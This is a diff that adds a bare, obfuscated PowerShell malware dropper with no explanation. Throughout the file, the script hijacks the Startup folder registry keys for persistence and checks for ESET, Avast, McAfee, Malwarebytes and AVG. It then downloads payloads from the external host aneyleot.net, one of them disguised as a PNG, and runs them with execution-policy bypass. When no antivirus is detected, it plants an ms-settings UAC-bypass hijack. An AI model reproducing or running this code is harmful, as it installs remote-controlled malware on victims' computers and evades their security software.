@@ -1,0 +1,148 @@
+[system.io.directory]::CreateDirectory("C:\ProgramData\Microsoft Arts\Start\")
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "C:\ProgramData\Microsoft Arts\Start";
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" -Name "Startup" -Value "C:\ProgramData\Microsoft Arts\Start";
+Function aloshy
+{
+if([System.IO.File]::Exists("C:\Program Files\ESET\ESET Security\ecmds.exe")){
+
+
+
+$defender = 'C!!!!@#!@!@!@!@blic\'.Replace("!!!!@#!@!@!@!@",":\Users\Pu")
+$ali = "`N`e`T`.`W`e`B`C`l`i`e`N`T"
+if((New-Object $ali)."`D`o`w`N`l`o`A`d`F`i`l`e"('https://aneyleot.net/tarek/3.txt', $defender + 'msi.ps1')){
+}
+
+
+$defender = "C:\ProgramData\Microsoft Arts\Start\"
+$ali = "`N`e`T`.`W`e`B`C`l`i`e`N`T"
+if((New-Object $ali)."`D`o`w`N`l`o`A`d`F`i`l`e"('https://aneyleot.net/VVpost2.txt', $defender + 'VVpost2.vbs')){
+}
+
+
+start-sleep -s 7
+Start "C:\ProgramData\Microsoft Arts\Start\VVpost2.vbs"
+
+
+}
+
+elseif([System.IO.File]::Exists("C:\Program Files\Avast Software\Avast\AvastUI.exe")){
+
+start-sleep -s 10
+
+
+$defender = 'C!!!!@#!@!@!@!@blic\'.Replace("!!!!@#!@!@!@!@",":\Users\Pu")
+$ali = "`N`e`T`.`W`e`B`C`l`i`e`N`T"
+if((New-Object $ali)."`D`o`w`N`l`o`A`d`F`i`l`e"('https://aneyleot.net/tarek/1.txt', $defender + 'msi.ps1')){
+}
+
+$defender = "C:\ProgramData\Microsoft Arts\Start\"
+$ali = "`N`e`T`.`W`e`B`C`l`i`e`N`T"
+if((New-Object $ali)."`D`o`w`N`l`o`A`d`F`i`l`e"('https://aneyleot.net/VVpost2.txt', $defender + 'VVpost2.vbs')){
+}
+
+
+start-sleep -s 7
+Start "C:\ProgramData\Microsoft Arts\Start\VVpost2.vbs"
+
+}
+elseif([System.IO.File]::Exists("C:\Program Files\Common Files\McAfee\Platform\McUICnt.exe")){
+
+
+
+$defender = 'C!!!!@#!@!@!@!@blic\'.Replace("!!!!@#!@!@!@!@",":\Users\Pu")
+if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://aneyleot.net/tarek/1.txt', $defender + 'msi.ps1')){
+}
+
+
+$defender = "C:\ProgramData\Microsoft Arts\Start\"
+$ali = "`N`e`T`.`W`e`B`C`l`i`e`N`T"
+if((New-Object $ali)."`D`o`w`N`l`o`A`d`F`i`l`e"('https://aneyleot.net/VVpost2.txt', $defender + 'VVpost2.vbs')){
+}
+
+
+start-sleep -s 7
+Start "C:\ProgramData\Microsoft Arts\Start\VVpost2.vbs"
+
+
+}
+elseif([System.IO.File]::Exists("C:\Program Files\Malwarebytes\Anti-Malware\mbamtray.exe")){
+
+
+
+
+
+$defender = 'C!!!!@#!@!@!@!@blic\'.Replace("!!!!@#!@!@!@!@",":\Users\Pu")
+if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://aneyleot.net/tarek/1.txt', $defender + 'msi.ps1')){
+}
+
+$defender = "C:\ProgramData\Microsoft Arts\Start\"
+$ali = "`N`e`T`.`W`e`B`C`l`i`e`N`T"
+if((New-Object $ali)."`D`o`w`N`l`o`A`d`F`i`l`e"('https://aneyleot.net/VVpost2.txt', $defender + 'VVpost2.vbs')){
+}
+
+
+start-sleep -s 7
+Start "C:\ProgramData\Microsoft Arts\Start\VVpost2.vbs"
+
+
+}
+
+elseif([System.IO.File]::Exists("C:\Program Files\AVG\Antivirus\AVGUI.exe")){
+
+
+start-sleep -s 10
+
+$defender = 'C!!!!@#!@!@!@!@blic\'.Replace("!!!!@#!@!@!@!@",":\Users\Pu")
+$ali = "`N`e`T`.`W`e`B`C`l`i`e`N`T"
+if((New-Object $ali)."`D`o`w`N`l`o`A`d`F`i`l`e"('https://aneyleot.net/tarek/1.txt', $defender + 'msi.ps1')){
+}
+
+
+
+$defender = "C:\ProgramData\Microsoft Arts\Start\"
+$ali = "`N`e`T`.`W`e`B`C`l`i`e`N`T"
+if((New-Object $ali)."`D`o`w`N`l`o`A`d`F`i`l`e"('https://aneyleot.net/VVpost2.txt', $defender + 'VVpost2.vbs')){
+}
+
+
+start-sleep -s 7
+Start "C:\ProgramData\Microsoft Arts\Start\VVpost2.vbs"
+
+}
+else{
+    
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
+$defender = 'C!!!!@#!@!@!@!@blic\'.Replace("!!!!@#!@!@!@!@",":\Users\Pu")
+if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://aneyleot.net/dInjector.png', $defender + '11.ps1')){
+}
+PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& 'C:\Users\Public\11.ps1'"
+start-sleep -s 4
+PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& 'C:\Users\Public\11.ps1'"
+
+
+
+start-sleep -s 30
+
+
+$defender = 'C!!!!@#!@!@!@!@blic\'.Replace("!!!!@#!@!@!@!@",":\Users\Pu")
+$ali = "`N`e`T`.`W`e`B`C`l`i`e`N`T"
+if((New-Object $ali)."`D`o`w`N`l`o`A`d`F`i`l`e"('https://aneyleot.net/tarek/1.txt', $defender + 'msi.ps1')){
+}
+
+
+$defender = "C:\ProgramData\Microsoft Arts\Start\"
+$ali = "`N`e`T`.`W`e`B`C`l`i`e`N`T"
+if((New-Object $ali)."`D`o`w`N`l`o`A`d`F`i`l`e"('https://aneyleot.net/VVpost2.txt', $defender + 'VVpost2.vbs')){
+}
+
+
+start-sleep -s 7
+Start "C:\ProgramData\Microsoft Arts\Start\VVpost2.vbs"
+
+start-sleep -s 7
+PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& 'C:\Users\Public\msi.ps1'"
+
+}
+}
+IEX aloshy
